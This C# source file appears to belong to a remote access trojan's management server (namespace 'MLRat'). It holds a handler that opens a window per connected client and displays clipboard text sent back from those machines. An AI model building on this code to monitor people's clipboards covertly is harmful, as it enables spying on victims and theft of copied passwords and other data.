using MLManagementServer.Forms;
using MLRat.Server;
using SharedCode.Network;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace MLManagementServer.Handlers
{
    public static class ClipboardHandler
    {
        static Dictionary<Guid, formClipboard> FormHandler = new Dictionary<Guid, formClipboard>();
        public static void Start(IClient c)
        {
            if(!FormHandler.ContainsKey(c.ID))
            {
                formClipboard form = new formClipboard(c);
                form.FormClosed += Form_FormClosed;
                FormHandler.Add(c.ID, form);
                form.Show();
            }
        }

        public static void ContextCallback(IClient[] clients)
        {
            foreach (IClient c in clients)
                Start(c);
        }

        public static void Disconnect(IClient c)
        {
            if (FormHandler.ContainsKey(c.ID))
            {
                FormHandler[c.ID].Close();
            }
        }

        public static void Handle(IClient c, object[] data)
        {
            ClipboardCommand command = (ClipboardCommand)data[1];
            if(command == ClipboardCommand.Text)
            {
                if(FormHandler.ContainsKey(c.ID))
                {
                    FormHandler[c.ID].SetClipboardText((string)data[2]);
                }
            }
        }

        private static void Form_FormClosed(object sender, System.Windows.Forms.FormClosedEventArgs e)
        {
            formClipboard form = (formClipboard)sender;
            if(FormHandler.ContainsKey(form.Client.ID))
            {
                FormHandler.Remove(form.Client.ID);
            }
            form.Dispose();
        }
    }
}
